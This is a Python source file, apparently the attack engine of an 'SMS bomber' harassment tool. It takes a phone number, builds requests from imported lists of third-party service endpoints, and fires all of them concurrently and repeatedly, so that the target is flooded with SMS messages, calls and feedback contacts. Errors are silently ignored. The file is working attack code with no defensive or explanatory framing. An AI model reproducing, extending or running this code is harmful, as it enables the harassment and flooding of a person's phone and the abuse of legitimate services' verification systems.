from asyncio import ensure_future, gather, run
from aiohttp import ClientSession

from Source.Bomber.Attack.Services import urls
from Source.Bomber.Attack.Feedback_Services import feedback_urls




async def request(session, url):
    try:
        type_attack = ('SMS', 'CALL', 'FEEDBACK')

        if url['info']['attack'] in type_attack:
            async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=20) as response:
                return await response.text()
    except:
        pass



async def async_attacks(number):
    async with ClientSession() as session:
        services = (urls(number) + feedback_urls(number))
        tasks = [ensure_future(request(session, service)) for service in services]
        await gather(*tasks)



def start_async_attacks(number, replay):

    for _ in range(int(replay)):
        run(async_attacks(number))